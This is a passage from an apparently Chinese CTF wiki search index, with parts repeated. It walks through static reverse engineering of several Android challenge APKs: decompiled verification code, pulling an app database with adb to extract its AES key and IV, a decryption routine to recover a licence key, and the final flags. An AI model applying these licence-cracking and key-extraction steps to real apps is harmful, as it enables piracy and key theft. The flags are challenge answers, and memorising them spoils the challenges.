)); appConfig . setDesc ( rawQuery . getString ( 7 )); } return appConfig ; } \u5176\u4e2d\uff0c\u51fd\u6570\u9996\u5148\u8fdb\u884c\u4e86\u6570\u636e\u5e93\u8bbf\u95ee\uff0cSELECT_QUERY\u5982\u4e0b private static String DB_NAME = \"db.db\" ; private static String DB_PATH = \"/data/data/edu.sharif.ctf/databases/\" ; public static final String SELECT_QUERY = ( \"SELECT * FROM \" + TABLE_NAME + \" WHERE a=1\" ); private static String TABLE_NAME = \"config\" ; \u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8be5\u6570\u636e\u5e93\u7684\u8def\u5f84\u3002 \u5728\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5728\u8fd9\u91cc\u9996\u5148\u83b7\u53d6\u4e86\u8868config\u7684\u9996\u884c\uff0c\u7136\u540e\u5c06iv\u8bbe\u7f6e\u4e3a\u7b2c\u56db\u5217\u7684\u503c\uff0ckey\u8bbe\u7f6e\u4e3a\u7b2c5\u5217\u7684\u503c\u3002 appConfig . setSecurityIv ( rawQuery . getString ( 4 )); appConfig . setSecurityKey ( rawQuery . getString ( 5 )); \u53c2\u65703 \u00b6 \u5176\u5b9e\uff0c\u53c2\u65703\u7c7b\u4f3c\u4e8e\u53c2\u65702\u3002\u8fd9\u91cc\u5c31\u4e0d\u505a\u8bf4\u660e\u4e86\u3002 \u83b7\u53d6\u6570\u636e\u5e93\u6587\u4ef6 \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5c06\u8be5apk\u6587\u4ef6\u88c5\u5230\u624b\u673a\u4e0a\uff0c\u7136\u540e\u5229\u7528\u5982\u4e0b\u6307\u4ee4\u83b7\u53d6 adb pull /data/data/edu.sharif.ctf/databases/db.db \u8fdb\u800c\u4f7f\u7528\u7535\u8111\u4e0a\u53ef\u4ee5\u67e5\u770bsqlite\u7684\u8f6f\u4ef6\u67e5\u770b\u4e00\u4e0b\uff0c\u8fd9\u91cc\u6211\u4f7f\u7528\u7684\u662f http://sqlitebrowser.org/ \u3002\u5982\u4e0b \u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230 SecurityIv=a5efdbd57b84ca36 SecurityKey=37eaae0141f1a3adf8a1dee655853714 \u5206\u6790\u52a0\u5bc6\u4ee3\u7801 \u00b6 public class KeyVerifier { public static final String CIPHER_ALGORITHM = \"AES/CBC/PKCS5Padding\" ; public static final String VALID_LICENCE = \"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84\" ; public static String bytesToHexString ( byte [] bArr ) { StringBuilder stringBuilder = new StringBuilder (); int length = bArr . length ; for ( int i = 0 ; i < length ; i ++) { stringBuilder . append ( String . format ( \"%02x\" , new Object []{ Integer . valueOf ( bArr [ i ] & 255 )})); } return stringBuilder . toString (); } public static String encrypt ( String str , String str2 , String str3 ) { String str4 = \"\" ; try { Key secretKeySpec = new SecretKeySpec ( hexStringToBytes ( str2 ), \"AES\" ); Cipher instance = Cipher . getInstance ( CIPHER_ALGORITHM ); instance . init ( 1 , secretKeySpec , new IvParameterSpec ( str3 . getBytes ())); str4 = bytesToHexString ( instance . doFinal ( str . getBytes ())); } catch ( Exception e ) { e . printStackTrace (); } return str4 ; } public static byte [] hexStringToBytes ( String str ) { int length = str . length (); byte [] bArr = new byte [( length / 2 )]; for ( int i = 0 ; i < length ; i += 2 ) { bArr [ i / 2 ] = ( byte ) (( Character . digit ( str . charAt ( i ), 16 ) << 4 ) + Character . digit ( str . charAt ( i + 1 ), 16 )); } return bArr ; } public static boolean isValidLicenceKey ( String str , String str2 , String str3 ) { return encrypt ( str , str2 , str3 ). equals ( VALID_LICENCE ); } } \u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u9996\u5148\u4f7f\u7528\u4e86encrypt\u51fd\u6570\u5bf9\u4e09\u4e2a\u5b57\u7b26\u4e32\u52a0\u5bc6\u3002\u5176\u5b9e\u5c31\u662f\u5229\u7528\u4e0a\u9762\u6240\u8bf4\u7684AES/CBC/PKCS5Padding\u65b9\u6cd5\u52a0\u5bc6\uff0c\u5c06str2\u4f5c\u4e3akey\uff0c\u5c06str3\u4f5c\u4e3a\u521d\u59cb\u5411\u91cf\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u6dfb\u52a0\u89e3\u5bc6\u51fd\u6570\u5982\u4e0b public static String decrypt ( String input , String secretKey , String iv ) { String encryptedText = \"\" ; try { SecretKeySpec secretKeySpec = new SecretKeySpec ( hexStringToBytes ( secretKey ), \"AES\" ); Cipher cipher = Cipher . getInstance ( CIPHER_ALGORITHM ); cipher . init ( 2 , secretKeySpec , new IvParameterSpec ( iv . getBytes ())); encryptedText = bytesToHexString ( cipher . doFinal ( hexStringToBytes ( userInput ))); } catch ( Exception e ) { e . printStackTrace (); } return encryptedText ; } \u7136\u540e\u8fd0\u884c\u5f97\u5230\u6b63\u5e38\u8f93\u5165\u7684product key fl-ag-IS-se-ri-al-NU-MB-ER 2015-0CTF-vezel \u00b6 \u5206\u6790 \u00b6 \u9996\u5148\uff0c\u5206\u6790\u4ee3\u7801\uff0c\u5982\u4e0b public void confirm(View v) { if(\"0CTF{\" + String.valueOf(this.getSig(this.getPackageName())) + this.getCrc() + \"}\".equals( this.et.getText().toString())) { Toast.makeText(((Context)this), \"Yes!\", 0).show(); } else { Toast.makeText(((Context)this), \"0ops!\", 0).show(); } } private String getCrc() { String v1; try { v1 = String.valueOf(new ZipFile(this.getApplicationContext().getPackageCodePath()).getEntry( \"classes.dex\").getCrc()); } catch(Exception v0) { v0.printStackTrace(); } return v1; } private int getSig(String packageName) { int v4; PackageManager v2 = this.getPackageManager(); int v5 = 64; try { v4 = v2.getPackageInfo(packageName, v5).signatures[0].toCharsString().hashCode(); } catch(Exception v0) { v0.printStackTrace(); } return v4; } \u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u60f3\u8981\u7684flag\u7684\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206 String.valueOf(this.getSig(this.getPackageName())) this.getCrc() \u5176\u4e2d\u7b2c\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u81ea\u5df1\u7f16\u5199\u4e00\u4e2aapp\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u503c\u3002\u7b2c\u4e8c\u90e8\u5206\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5c06dex\u6587\u4ef6\u63d0\u53d6\u51fa\u6765\uff0c\u5229\u7528\u7f51\u4e0a\u7684\u5de5\u5177\u8ba1\u7b97\u4e00\u4e0b\u3002 hashcode \u00b6 \u968f\u4fbf\u627e\u4e86\u4e2a\uff08\u653e\u5728\u5bf9\u5e94\u7684example\u6587\u4ef6\u5939\u4e0b\uff09 package com.iromise.getsignature; import android.content.pm.PackageInfo; import android.content.pm.PackageManager; import android.content.pm.Signature; import android.support.v7.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.util.Log; import android.widget.Toast; public class MainActivity extends AppCompatActivity { private StringBuilder builder; public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); PackageManager manager = getPackageManager(); builder = new StringBuilder(); String pkgname = \"com.ctf.vezel\"; boolean isEmpty = TextUtils.isEmpty(pkgname); if (isEmpty) { Toast.makeText(this, \"\u5e94\u7528\u7a0b\u5e8f\u7684\u5305\u540d\u4e0d\u80fd\u4e3a\u7a7a\uff01\", Toast.LENGTH_SHORT); } else { try { PackageInfo packageInfo = manager.getPackageInfo(pkgname, PackageManager.GET_SIGNATURES); Signature[] signatures = packageInfo.signatures; Log.i(\"hashcode\", String.valueOf(signatures[0].toCharsString().hashCode())); } catch (PackageManager.NameNotFoundException e) { e.printStackTrace(); } } } } \u7136\u540e\u518dddms\u4e2d\u8fc7\u6ee4\u51fahashcode 07-18 11:05:11.895 16124-16124/? I/hashcode: -183971537 \u6ce8\uff1a\u5176\u5b9e\u8fd9\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u5199\u6210\u4e00\u4e2a\u5c0f\u7684app\uff0c\u5f88\u591a\u7a0b\u5e8f\u90fd\u4f1a\u8ba1\u7b97\u7b7e\u540d\u3002 classes.dex crc32 \u00b6 \u968f\u4fbf\u627e\u4e2a\u5728\u7ebf\u7f51\u7ad9\u83b7\u53d6\u4e00\u4e0b classes.dex \u7684CRC32\u503c\u3002 CRC-32 46e26557 MD5 Hash 3217b0ad6c769233ea2a49d17885b5ba SHA1 Hash ec3b4730654248a02b016d00c9ae2425379bf78f SHA256 Hash 6fb1df4dacc95312ec72d8b79d22529e1720a573971f866bbf8963b01499ecf8 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u9700\u8981\u8f6c\u6210\u5341\u8fdb\u5236 >>> print int(\"46E26557\", 16) 1189242199 flag \u00b6 \u4e24\u90e8\u5206\u7b97\u5b8c\u5408\u8d77\u6765\u5c31\u662fFlag Flag\uff1a0ctf{-1839715371189242199} 2017 XMAN HelloSmali2 \u00b6 \u7ed9\u7684\u662f\u4e00\u4e2a smali \u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u601d\u8def\u6765\u505a \u5229\u7528 smali.jar \u5c06 smali \u6c47\u7f16\u4e3a dex \u6587\u4ef6\u3002 java -jar smali.jar assemble src.smali -o src.dex \u4f7f\u7528 jadx \u53cd\u7f16\u8bd1 dex\uff0c\u5982\u4e0b package com.example.hellosmali.hellosmali ; public class Digest { public static boolean check ( String input ) { String str = \"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" ; if ( input == null || input . length () == 0 ) { return false ; } int i ; char [] charinput = input . toCharArray (); StringBuilder v2 = new StringBuilder (); for ( char toBinaryString : charinput ) { String intinput = Integer . toBinaryString ( toBinaryString ); while ( intinput . length () < 8 ) { intinput = \"0\" + intinput ; } v2 . append ( intinput ); } while ( v2 . length () % 6 != 0 ) { v2 . append ( \"0\" ); } String v1 = String . valueOf ( v2 ); char [] v4 = new char [( v1 . length () / 6 )]; for ( i = 0 ; i < v4 . length ; i ++) { int v6 = Integer . parseInt ( v1 . substring ( 0 , 6 ), 2 ); v1 = v1 . substring ( 6 ); v4 [ i ] = str . charAt ( v6 ); } StringBuilder v3 = new StringBuilder ( String . valueOf ( v4 )); if ( input . length () % 3 == 1 ) { v3 . append ( \"!?\" ); } else if ( input . length () % 3 == 2 ) { v3 . append ( \"!\" ); } if ( String . valueOf ( v3 ). equals ( \"xsZDluYYreJDyrpDpucZCo!?\" )) { return true ; } return false ; } } \u7b80\u5355\u770b\u4e00\u4e0b\uff0c\u5176\u5b9e\u662f\u4e00\u4e2a\u53d8\u79cd\u7684 base64 \u52a0\u5bc6\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u7f51\u4e0a\u627e\u4e00\u4e2a base64 \u7f16\u7801\uff0c\u7136\u540e\u8bbe\u7f6e\u4e00\u4e0b\u5c31\u597d\u4e86\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u811a\u672c\u6765\u81ea\u4e8e http://www.cnblogs.com/crazyrunning/p/7382693.html \u3002 #coding=utf8 import string base64_charset = '+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' def decode ( base64_str ): \"\"\" \u89e3\u7801base64\u5b57\u7b26\u4e32 :param base64_str:base64\u5b57\u7b26\u4e32 :return:\u89e3\u7801\u540e\u7684bytearray\uff1b\u82e5\u5165\u53c2\u4e0d\u662f\u5408\u6cd5base64\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u7a7abytearray \"\"\" # \u5bf9\u6bcf\u4e00\u4e2abase64\u5b57\u7b26\u53d6\u4e0b\u6807\u7d22\u5f15\uff0c\u5e76\u8f6c\u6362\u4e3a6\u4e3a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 base64_bytes = [ '{:0>6}' . format ( str ( bin ( base64_charset . index ( s ))) . replace ( '0b' , '' )) for s in base64_str if s != '=' ] resp = bytearray () nums = len ( base64_bytes ) // 4 remain = len ( base64_bytes ) % 4 integral_part = base64_bytes [ 0 : 4 * nums ] while integral_part : # \u53d64\u4e2a6\u4f4dbase64\u5b57\u7b26\uff0c\u4f5c\u4e3a3\u4e2a\u5b57\u8282 tmp_unit = '' . join ( integral_part [ 0 : 4 ]) tmp_unit = [ int ( tmp_unit [ x : x + 8 ], 2 ) for x in [ 0 , 8 , 16 ]] for i in tmp_unit : resp . append ( i ) integral_part = integral_part [ 4 :] if remain : remain_part = '' . join ( base64_bytes [ nums * 4 :]) tmp_unit = [ int ( remain_part [ i * 8 :( i + 1 ) * 8 ], 2 ) for i in range ( remain - 1 )] for i in tmp_unit : resp . append ( i ) return resp if __name__ == \"__main__\" : print decode ( 'A0NDlKJLv0hTA1lDAuZRgo==' ) \u7ed3\u679c\u5982\u4e0b \u279c tmp python test.py eM_5m4Li_i4_Ea5y \u9898\u76ee \u00b6 GCTF 2017 Android1 GCTF 2017 Android2 ISG 2017 Crackme XMAN 2017 mobile3 rev1","title":"Android Java \u5c42\u9759\u6001\u5206\u6790"},{"location":"android/basic_reverse/static/java-example/#java","text":"","title":"\u9759\u6001\u5206\u6790 java \u5c42\u4f8b\u5b50"},{"location":"android/basic_reverse/static/java-example/#2014-tinyctf-ooooooh-what-does-this-button-do","text":"","title":"2014 tinyCTF Ooooooh! What does this button do"},{"location":"android/basic_reverse/static/java-example/#_1","text":"\u901a\u8fc7linux\u7684file\u547d\u4ee4\u53ef\u4ee5\u770b\u51fa\u8be5\u6587\u4ef6\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u6253\u5f00\u53d1\u73b0\u5b83\u5176\u5b9e\u662f\u4e00\u4e2aapk\u6587\u4ef6\u3002","title":"\u786e\u5b9a\u6587\u4ef6\u7c7b\u578b"},{"location":"android/basic_reverse/static/java-example/#apk","text":"\u5b89\u88c5\u6587\u4ef6\u4e4b\u540e\uff0c\u67e5\u770b\u4e00\u4e0b \u53ef\u4ee5\u770b\u51fa\u5176\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5e94\u8be5\u4f1a\u5f39\u51fa\u7ed3\u679c\u3002","title":"\u5b89\u88c5apk"},{"location":"android/basic_reverse/static/java-example/#_2","text":"class C00721 implements OnClickListener { C00721 () { } public void onClick ( View view ) { if ((( EditText ) MainActivity . this . findViewById ( C0073R . id . passwordField )). getText (). toString (). compareTo ( \"EYG3QMCS\" ) == 0 ) { MainActivity . this . startActivity ( new Intent ( MainActivity . this , FlagActivity . class )); } } } \u5728\u4e3b\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4e3aEYG3QMCS\u5c31\u4f1a\u6267\u884cflagActivity.class\u3002\u90a3\u4e48\u6211\u4eec\u8f93\u5165\u4e00\u4e0b\uff0c\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c \u5373\u5f97\u5230flag\u3002","title":"\u67e5\u770b\u7a0b\u5e8f"},{"location":"android/basic_reverse/static/java-example/#2014-asis-cyber-security-contest-finals-numdroid","text":"","title":"2014 ASIS Cyber Security Contest Finals Numdroid"},{"location":"android/basic_reverse/static/java-example/#_3","text":"\u9996\u5148\u5229\u7528file\u5224\u65ad\u4e00\u4e0b\u6587\u4ef6\u7c7b\u578b\uff0c\u53d1\u73b0\u662f\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u7f29\u4e00\u4e0b\uff0c\u5f97\u5230\u5bf9\u5e94\u7684\u6587\u4ef6\uff0c\u7136\u540e\u7ee7\u7eed\u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u8be5\u6587\u4ef6\u662fapk\u6587\u4ef6\u3002","title":"\u5224\u65ad\u6587\u4ef6\u7c7b\u578b"},{"location":"android/basic_reverse/static/java-example/#_4","text":"\u5b89\u88c5\u4e00\u4e0b\u7a0b\u5e8f\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u9875\u9762\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4e3b\u8981\u662f\u8f93\u5165\u5bc6\u7801\uff0c\u7136\u540e\u767b\u9646\u3002\u5982\u679c\u8f93\u5165\u9519\u7684\u8bdd\u4f1a\u7206\u51fa\u201cWrong Password\u201d\u7684\u4fe1\u606f\u3002","title":"\u5b89\u88c5\u7a0b\u5e8f"},{"location":"android/basic_reverse/static/java-example/#_5","text":"\u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\u4e32\u6765\u5b9a\u4f4d\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684\u5173\u952e\u51fd\u6570\u3002\u6839\u636estrings.xml\u53ef\u4ee5\u53d1\u73b0\u8be5\u5b57\u7b26\u4e32\u7684\u53d8\u91cf\u540d\u4e3awrong\uff0c\u7ee7\u800c\u6211\u4eec\u627e\u5230\u4e86\u5982\u4e0b\u4ee3\u7801\u3002 protected void ok_clicked () { DebugTools . log ( \"clicked password: \" + this . mScreen . getText ()); boolean result = Verify . isOk ( this , this . mScreen . getText (). toString ()); DebugTools . log ( \"password is Ok? : \" + result ); if ( result ) { Intent i = new Intent ( this , LipSum . class ); Bundle b = new Bundle (); b . putString ( \"flag\" , this . mScreen . getText (). toString (). substring ( 0 , 7 )); i . putExtras ( b ); startActivity ( i ); return ; } Toast . makeText ( this , R . string . wrong , 1 ). show (); this . mScreen . setText ( \"\" ); } \u7ee7\u7eed\u5b9a\u4f4d\u5230Verify.isOk\u4e2d\u3002\u5982\u4e0b public static boolean isOk ( Context c , String _password ) { String password = _password ; if ( _password . length () > 7 ) { password = _password . substring ( 0 , 7 ); } String r = OneWayFunction ( password ); DebugTools . log ( \"digest: \" + password + \" => \" + r ); if ( r . equals ( \"be790d865f2cea9645b3f79c0342df7e\" )) { return true ; } return false ; } \u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4e3b\u8981\u662f\u53d6password\u7684\u524d7\u4f4d\u8fdb\u884cOneWayFunction\u52a0\u5bc6\uff0c\u7136\u540e\u4e0ebe790d865f2cea9645b3f79c0342df7e\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u76f8\u7b49\u5c31\u4f1a\u8fd4\u56detrue\u3002\u8fd9\u91cc\u6211\u4eec\u518d\u770b\u4e00\u4e0bOneWayFunction\uff0c\u5982\u4e0b private static String OneWayFunction ( String password ) { List < byte []> bytes = ArrayTools . map ( ArrayTools . select ( ArrayTools . map ( new String []{ \"MD2\" , \"MD5\" , \"SHA-1\" , \"SHA-256\" , \"SHA-384\" , \"SHA-512\" }, new AnonymousClass1 ( password )), new SelectAction < byte []>() { public boolean action ( byte [] element ) { return element != null ; } }), new MapAction < byte [], byte []>() { public byte [] action ( byte [] element ) { int i ; byte [] b = new byte [ 8 ]; for ( i = 0 ; i < b . length / 2 ; i ++) { b [ i ] = element [ i ]; } for ( i = 0 ; i < b . length / 2 ; i ++) { b [( b . length / 2 ) + i ] = element [( element . length - i ) - 2 ]; } return b ; } }); byte [] b2 = new byte [( bytes . size () * 8 )]; for ( int i = 0 ; i < b2 . length ; i ++) { b2 [ i ] = (( byte []) bytes . get ( i % bytes . size ()))[ i / bytes . size ()]; } try { MessageDigest digest = MessageDigest . getInstance ( \"MD5\" ); digest . update ( b2 ); byte [] messageDigest = digest . digest (); StringBuilder hexString = new StringBuilder (); for ( byte aMessageDigest : messageDigest ) { String h = Integer . toHexString ( aMessageDigest & MotionEventCompat . ACTION_MASK ); while ( h . length () < 2 ) { h = \"0\" + h ; } hexString . append ( h ); } return hexString . toString (); } catch ( NoSuchAlgorithmException e ) { return \"\" ; } } \u51fd\u6570\u5927\u6982\u5c31\u662f\u6267\u884c\u4e86\u51e0\u4e2ahash\u503c\uff0c\u4f46\u662f\u81ea\u5df1\u53bb\u5206\u6790\u7684\u8bdd\uff0c\u592a\u8fc7\u4e8e\u590d\u6742\uff0c\uff0c\u7531\u4e8e\u672c\u9898\u7684\u7b54\u6848\u7a7a\u95f4( 10^7 10^7 )\u6bd4\u8f83\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628averify\u7c7b\u4e2d\u7684\u65b9\u6cd5\u62ff\u51fa\u6765\u81ea\u5df1\u66b4\u529b\u8dd1\u4e00\u4e0b\u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"android/basic_reverse/static/java-example/#_6","text":"\u63d0\u53d6\u51fajava\u7a0b\u5e8f\u4e4b\u540e\uff0c\u5728Verify\u7c7b\u4e2d\u6dfb\u52a0main\u51fd\u6570\u5e76\u4fee\u590d\u90e8\u5206\u9519\u8bef\uff0c\u4ece\u800c\u5f97\u5230\u5bf9\u5e94\u7684\u7b54\u6848\u3002 \u8fd9\u91cc\u5bf9\u5e94\u7684\u4ee3\u7801\u653e\u5728\u4e86example\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u4e2d\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u5982\u679c\u5bf9\u5e94\u7684hash\u51fd\u6570\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u6e90\u7a0b\u5e8f\u4f1a\u8df3\u8fc7\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u6211\u76f4\u63a5\u5168\u90e8\u8dd1\u6ca1\u6709\u627e\u5230\uff0c\u7136\u540e\u53bb\u6389\u4e86\u4e00\u4e2a\u4e0d\u5e38\u89c1\u7684MD2\u7b97\u6cd5\uff0c\u4ece\u800c\u5f97\u5230\u4e86\u7b54\u6848\u3002\u8fd9\u8bf4\u660eandroid\u5e94\u8be5\u662f\u6ca1\u6709md2\u7b97\u6cd5\u7684\u3002 \u8f93\u5165\u4e4b\u540e\u5f97\u5230\u5982\u4e0b \u7136\u540e\u6211\u4eec\u8ba1\u7b97\u5bf9\u5e94\u7684MD\u503c\uff0c\u4ece\u800c\u83b7\u5f97flag\u4e3aASIS_3c56e1ed0597056fef0006c6d1c52463\u3002","title":"\u6784\u9020\u7a0b\u5e8f"},{"location":"android/basic_reverse/static/java-example/#2014-sharif-university-quals-ctf-commercial-application","text":"","title":"2014 Sharif University Quals CTF Commercial Application"},{"location":"android/basic_reverse/static/java-example/#_7","text":"\u9996\u5148\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u968f\u4fbf\u70b9\u4e86\u70b9\u6309\u94ae\uff0c\u5728\u53f3\u4e0a\u65b9\u70b9\u51fb\u6309\u94ae\u4f1a\u8ba9\u6211\u4eec\u8f93\u5165key \u968f\u4fbf\u8f93\u5165\u4e86\u4e0b\uff0c\u53d1\u73b0\u7a0b\u5e8f\u76f4\u63a5\u62a5\u9519\uff0c\u544a\u8bc9\u6211\u4eec\u4e0d\u5bf9\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u6765\u8fdb\u884c\u5b9a\u4f4d\u5173\u952e\u4ee3\u7801\u3002","title":"\u5b89\u88c5\u7a0b\u5e8f"},{"location":"android/basic_reverse/static/java-example/#_8","text":"public static final String NOK_LICENCE_MSG = \"Your licence key is incorrect...! Please try again with another.\" ; public static final String OK_LICENCE_MSG = \"Thank you, Your application has full licence. Enjoy it...!\" ; private void checkLicenceKey ( final Context context ) { if ( this . app . getDataHelper (). getConfig (). hasLicence ()) { showAlertDialog ( context , OK_LICENCE_MSG ); return ; } View inflate = LayoutInflater . from ( context ). inflate ( C0080R . layout . propmt , null ); Builder builder = new Builder ( context ); builder . setView ( inflate ); final EditText editText = ( EditText ) inflate . findViewById ( C0080R . id . editTextDialogUserInput ); builder . setCancelable ( false ). setPositiveButton ( \"Continue\" , new OnClickListener () { public void onClick ( DialogInterface dialogInterface , int i ) { if ( KeyVerifier . isValidLicenceKey ( editText . getText (). toString (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityKey (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityIv ())) { MainActivity . this . app . getDataHelper (). updateLicence ( 2014 ); MainActivity . isRegisterd = true ; MainActivity . this . showAlertDialog ( context , MainActivity . OK_LICENCE_MSG ); return ; } MainActivity . this . showAlertDialog ( context , MainActivity . NOK_LICENCE_MSG ); } }). setNegativeButton ( \"Cancel\" , new C00855 ()); builder . create (). show (); } \u6211\u4eec\u53d1\u73b0\uff0c\u5176\u5b9e MainActivity.NOK_LICENCE_MSG\u5c31\u5b58\u50a8\u7740\u62a5\u9519\u7684\u5b57\u7b26\u4e32\u4fe1\u606f\uff0c\u518d\u7ee7\u7eed\u8bfb\u4e00\u4e0b\u53d1\u73b0\u7a0b\u5e8f\u4f7f\u7528 KeyVerifier . isValidLicenceKey ( editText . getText (). toString (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityKey (), MainActivity . this . app . getDataHelper (). getConfig (). getSecurityIv ()) \u6765\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u9a8c\u8bc1\u901a\u8fc7\u5c31\u4f1a\u8df3\u51fa\u6210\u529f\u4fe1\u606f\u3002","title":"\u5b9a\u4f4d\u5173\u952e\u4ee3\u7801"},{"location":"android/basic_reverse/static/java-example/#_9","text":"\u8fdb\u800c\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u4e09\u4e2a\u53c2\u6570\u3002","title":"\u8be6\u7ec6\u5206\u6790"},{"location":"android/basic_reverse/static/java-example/#1","text":"\u53c2\u65701\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u3002","title":"\u53c2\u65701"},{"location":"android/basic_reverse/static/java-example/#2","text":"\u662f\u5229\u7528\u51fd\u6570\u6765\u83b7\u53d6getSecurityKey\uff0c\u6211\u4eec\u7b80\u5355\u9605\u8bfb\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5728getConfig\u51fd\u6570\u4e2d\u8bbe\u7f6e\u4e86SecurityKey public AppConfig getConfig () { boolean z = false ; AppConfig appConfig = new AppConfig (); Cursor rawQuery = this . myDataBase . rawQuery ( SELECT_QUERY , null ); if ( rawQuery . moveToFirst ()) { appConfig . setId ( rawQuery . getInt ( 0 )); appConfig . setName ( rawQuery . getString ( 1 )); appConfig . setInstallDate ( rawQuery . getString ( 2 )); if ( rawQuery . getInt ( 3 ) > 0 ) { z = true ; } appConfig . setValidLicence ( z ); appConfig . setSecurityIv ( rawQuery . getString ( 4 )); appConfig . setSecurityKey ( rawQuery . getString ( 5 )); appConfig . setDesc ( rawQuery . getString ( 7 )); } return appConfig ; } \u5176\u4e2d\uff0c\u51fd\u6570\u9996\u5148\u8fdb\u884c\u4e86\u6570\u636e\u5e93\u8bbf\u95ee\uff0cSELECT_QUERY\u5982\u4e0b private static String DB_NAME = \"db.db\" ; private static String DB_PATH = \"/data/data/edu.sharif.ctf/databases/\" ; public static final String SELECT_QUERY = ( \"SELECT * FROM \" + TABLE_NAME + \" WHERE a=1\" ); private static String TABLE_NAME = \"config\" ; \u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8be5\u6570\u636e\u5e93\u7684\u8def\u5f84\u3002 \u5728\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5728\u8fd9\u91cc\u9996\u5148\u83b7\u53d6\u4e86\u8868config\u7684\u9996\u884c\uff0c\u7136\u540e\u5c06iv\u8bbe\u7f6e\u4e3a\u7b2c\u56db\u5217\u7684\u503c\uff0ckey\u8bbe\u7f6e\u4e3a\u7b2c5\u5217\u7684\u503c\u3002 appConfig . setSecurityIv ( rawQuery . getString ( 4 )); appConfig . setSecurityKey ( rawQuery . getString ( 5 ));","title":"\u53c2\u65702"},{"location":"android/basic_reverse/static/java-example/#3","text":"\u5176\u5b9e\uff0c\u53c2\u65703\u7c7b\u4f3c\u4e8e\u53c2\u65702\u3002\u8fd9\u91cc\u5c31\u4e0d\u505a\u8bf4\u660e\u4e86\u3002","title":"\u53c2\u65703"},{"location":"android/basic_reverse/static/java-example/#_10","text":"\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5c06\u8be5apk\u6587\u4ef6\u88c5\u5230\u624b\u673a\u4e0a\uff0c\u7136\u540e\u5229\u7528\u5982\u4e0b\u6307\u4ee4\u83b7\u53d6 adb pull /data/data/edu.sharif.ctf/databases/db.db \u8fdb\u800c\u4f7f\u7528\u7535\u8111\u4e0a\u53ef\u4ee5\u67e5\u770bsqlite\u7684\u8f6f\u4ef6\u67e5\u770b\u4e00\u4e0b\uff0c\u8fd9\u91cc\u6211\u4f7f\u7528\u7684\u662f http://sqlitebrowser.org/ \u3002\u5982\u4e0b \u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230 SecurityIv=a5efdbd57b84ca36 SecurityKey=37eaae0141f1a3adf8a1dee655853714","title":"\u83b7\u53d6\u6570\u636e\u5e93\u6587\u4ef6"},{"location":"android/basic_reverse/static/java-example/#_11","text":"public class KeyVerifier { public static final String CIPHER_ALGORITHM = \"AES/CBC/PKCS5Padding\" ; public static final String VALID_LICENCE = 